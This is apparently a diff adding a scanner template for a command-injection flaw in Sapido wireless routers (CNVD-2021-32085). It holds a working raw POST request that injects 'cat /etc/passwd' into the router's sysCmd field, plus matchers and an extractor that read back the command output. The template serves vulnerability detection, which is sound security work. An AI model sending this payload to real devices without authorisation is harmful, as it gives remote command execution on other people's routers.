@@ -1,0 +1,40 @@
+id: sapido-syscmd-rce-cnvd-2021-32085
+info:
+  name: Sapido syscmd.htm Remote Command Execution (CNVD-2021-32085)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    There is a command execution vulnerability in the `syscmd.htm` page of Sapido wireless routers. Attackers can execute arbitrary commands to obtain server permissions.
+  tags: rce, command-execution
+  reference:
+    - http://www.sapido.com.tw
+  classification:
+    cvss-score: 9.0
+    cwe-id:
+      - CWE-77
+
+variables:
+  cmd: "cat /etc/passwd"
+
+http:
+  - raw:
+      - |
+        POST /boafrm/formSysCmd HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        sysCmd={{cmd | url_encode}}&apply=Apply&submit-url=%2Fsyscmd.htm&msg=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:(x*?):0:0:"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "<textarea rows=\"15\" name=\"msg\" cols=\"80\" wrap=\"virtual\">((.|\\n)*?)</textarea>"
+        group: 1
